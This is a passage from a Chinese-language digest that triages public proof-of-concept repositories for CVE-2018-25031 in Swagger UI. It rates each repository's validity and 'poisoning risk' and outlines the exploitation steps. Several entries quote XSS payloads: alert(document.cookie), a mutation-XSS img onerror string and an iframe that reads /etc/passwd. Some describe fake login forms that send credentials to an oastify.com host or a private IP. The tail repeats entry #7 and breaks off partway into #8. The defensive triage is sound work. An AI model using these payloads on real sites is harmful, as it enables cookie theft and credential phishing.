1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

